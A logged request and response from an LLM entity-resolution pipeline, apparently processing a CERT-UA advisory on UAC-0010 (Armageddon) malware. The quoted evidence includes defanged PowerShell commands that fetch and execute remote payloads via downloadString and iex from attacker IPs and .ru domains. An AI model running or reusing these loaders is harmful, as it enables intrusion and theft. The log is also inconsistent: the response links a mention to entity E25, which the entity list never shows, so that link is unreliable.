=== REQUEST (gemini gemini-3.7-flash) ===
--- sampling ---
{"temperature":0}
--- instructions ---
You are an entity-resolution judge for an incremental entity registry. For every mention you decide one thing: which entity it is. Hierarchy between entities is decided elsewhere — never answer it here.

The source lists its known entities once, as `E1…En`. Every mention names the subset of those entities that plausibly match it. Use the numbers; never write a name where a number is asked for. A mention may carry a `ctx:` reference naming the evidence window(s) (`S1. …`) that contain it.

## 1. `id` — identity (exact match)

Answer `"NEW"` when the mention refers to an entity that is none of its listed options; otherwise the option's `E` number. Only choose an existing entity when the supplied names and aliases support identity. Category, role, behavior, relationships, co-occurrence, and thematic similarity are NOT identity evidence. The order of options is retrieval score, which is not evidence.

Same entity — the names differ only in written form:

- a vendor, publisher, or organization prefix present in one ("Acme Foo" / "Foo");
- spacing, punctuation, hyphenation, case ("FooBar" / "Foo Bar");
- a parenthetical or bracketed descriptor ("foo (the loader used here)" / "foo");
- a file extension, platform, or implementation suffix ("foo.bin" / "foo", "Foo .NET" / "Foo");
- a generic type word stating only what kind of thing it is ("Foo tool" / "Foo");
- an acronym beside its own expansion;
- a transliteration or translation of the same proper name.

Different entities, however related — version, edition, year or identifier differs; one is a part, component or member of the other; one is a file or artifact and the other the program that made it; the base names differ. When names are alike except for an identifier or a number, match those characters exactly and never choose an option whose identifier differs. When a name pairs a structured identifier with a descriptive label — in either order, one of them usually bracketed ("K-12 (Foo)", "Foo (K-12)") — the identifier is what the name identifies. Choose the option carrying that identifier, and treat the bare label on its own as a different, broader entity.

If in doubt, answer `"NEW"`: a duplicate is repairable, a wrong merge is not.

## 2. `g` — gloss

For every mention you did NOT link, one short factual description — at most twelve words, grounded in the source, **not restating the name**. It is used to retrieve this entity later, never as identity evidence. Use `null` when the source says nothing descriptive.

## Output

Source context bears on identity only, and only where it explicitly establishes an alias, identifier, transliteration, abbreviation, or unambiguous co-reference.

Output one raw JSON object per line (JSONL), no markdown fences, no commentary, no wrapping array, one line per mention, in order, keys exactly `m`, `id`, `g`:
{"m":"M1","id":"E3","g":null}
{"m":"M2","id":"NEW","g":"a 2010 release of the suite"}

--- text ---
Source: "Кібератаки групи UAC-0010 (Armageddon): шкідливі програми GammaLoad, GammaSteel (CERT-UA#5134)" — evidence: S1. "ків, серед іншого, є викрадення файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.</p><p>Крім того, однією з тактик зловмисників є ураження файлу шаблону C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\Normal.dotm за допомо" S2. "ня персистентності та запуску пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe.</p><p><br></p><p><strong>Індикатори компрометації</strong></p><p><em>Файли:</em></p><pre class="ql-syntax" spellchec" S3. "ient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa; C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::Write" S4. "php') $tmp); iEx(IeX $tmp) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};whil" S5. "x.txt') $Doc); iex(iex $Doc) C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddress"
Entities:
E1. z.ps1
M3. "HarvesterX" (Software) — options: E17, E18, E19, E12 — ctx: S1
M4. "PowerShell (powershell.exe)" (Software) — options: E25, E26, E27, E28 — ctx: S2
M5. "lover.printing82.detroito.ru" (Domain) — options: E38, E39, E40, E41
M6. "atlantar.ru" (Domain) — options: E41, E43, E39, E48
M7. "motoristo.ru" (Domain) — options: E48, E44, E51, E39 — ctx: S8
M8. "moolin.ru" (Domain) — options: E38, E39, E41, E42
M9. "bubenci.ru" (Domain) — options: E48, E39, E56, E38
M10. "callsol.ru" (Domain) — options: E55, E46, E49, E39
M11. "clipperso.ru" (Domain) — options: E38, E39, E61, E48
M12. "cooperi.ru" (Domain) — options: E38, E39, E62, E63
M13. "detroito.ru" (Domain) — options: E38, E56, E40, E39
M14. "farafauler.ru" (Domain) — options: E41, E39, E67, E43
M15. "flayga.ru" (Domain) — options: E48, E39, E40, E38 — ctx: S4
M16. "ganara.ru" (Domain) — options: E41, E70, E40, E39 — ctx: S3
M17. "hawksi.ru" (Domain) — options: E38, E56, E39, E48
M18. "hofsteder.ru" (Domain) — options: E38, E39, E73, E41
M19. "kilitro.ru" (Domain) — options: E38, E40, E39, E41
M20. "kurapat.ru" (Domain) — options: E38, E66, E46, E39
M21. "lnasfe.ru" (Domain) — options: E55, E78, E79, E39 — ctx: S6
M22. "lopasts.ru" (Domain) — options: E38, E80, E39, E48
M23. "mafirti.ru" (Domain) — options: E38, E57, E39, E48
M24. "metanat.ru" (Domain) — options: E38, E66, E53, E39
M25. "mitlubald.ru" (Domain) — options: E38, E75, E39, E48
M26. "paparat.ru" (Domain) — options: E38, E66, E86, E39 — ctx: S5
M27. "pasamart.ru" (Domain) — options: E48, E39, E80, E38
M28. "qkcew.ru" (Domain) — options: E38, E39, E55, E42
M29. "rncsq.ru" (Domain) — options: E38, E39, E89, E55
M30. "tarlit.ru" (Domain) — options: E48, E66, E39, E43
M31. "tbwelo.ru" (Domain) — options: E38, E39, E44, E48
M32. "wicksl.ru" (Domain) — options: E38, E39, E71, E55
M33. "xcqef.ru" (Domain) — options: E55, E39, E76, E38
M34. "nxkad.ru" (Domain) — options: E55, E88, E75, E39 — ctx: S7
M35. "dnslookup.seowebchecker.com" (Domain) — options: E95, E96, E97, E98
M36. "tools.nexcess.net" (Domain) — options: E104, E105, E106, E107
M37. "viewdns.info" (Domain) — options: E95, E99, E106, E113
M38. "www.portcheckers.com" (Domain) — options: E118, E119, E51, E120 — ctx: S7

=== RESPONSE (6.9s, in 4233 / out 640 tok, STOP) ===
{"m":"M1","id":"NEW","g":"PowerShell implementation used to steal files and browser credentials"}
{"m":"M2","id":"NEW","g":".NET malware used to steal files and browser authentication data"}
{"m":"M3","id":"NEW","g":"previously used tool related to GammaSteel.PS1"}
{"m":"M4","id":"E25","g":null}
{"m":"M5","id":"NEW","g":null}
{"m":"M6","id":"NEW","g":null}
{"m":"M7","id":"NEW","g":null}
{"m":"M8","id":"NEW","g":null}
{"m":"M9","id":"NEW","g":null}
{"m":"M10","id":"NEW","g":null}
{"m":"M11","id":"NEW","g":null}
{"m":"M12","id":"NEW","g":null}
{"m":"M13","id":"NEW","g":null}
{"m":"M14","id":"NEW","g":null}
{"m":"M15","id":"NEW","g":"domain queried via DNS in PowerShell payload"}
{"m":"M16","id":"NEW","g":"domain queried via DNS in PowerShell payload"}
{"m":"M17","id":"NEW","g":null}
{"m":"M18","id":"NEW","g":null}
{"m":"M19","id":"NEW","g":null}
{"m":"M20","id":"NEW","g":null}
{"m":"M21","id":"NEW","g":null}
{"m":"M22","id":"NEW","g":null}
{"m":"M23","id":"NEW","g":null}
{"m":"M24","id":"NEW","g":null}
{"m":"M25","id":"NEW","g":null}
{"m":"M26","id":"NEW","g":null}
{"m":"M27","id":"NEW","g":null}
{"m":"M28","id":"NEW","g":null}
{"m":"M29","id":"NEW","g":null}
{"m":"M30","id":"NEW","g":null}
{"m":"M31","id":"NEW","g":null}
{"m":"M32","id":"NEW","g":null}
{"m":"M33","id":"NEW","g":null}
{"m":"M34","id":"NEW","g":null}
{"m":"M35","id":"NEW","g":null}
{"m":"M36","id":"NEW","g":null}
{"m":"M37","id":"NEW","g":null}
{"m":"M38","id":"NEW","g":null}
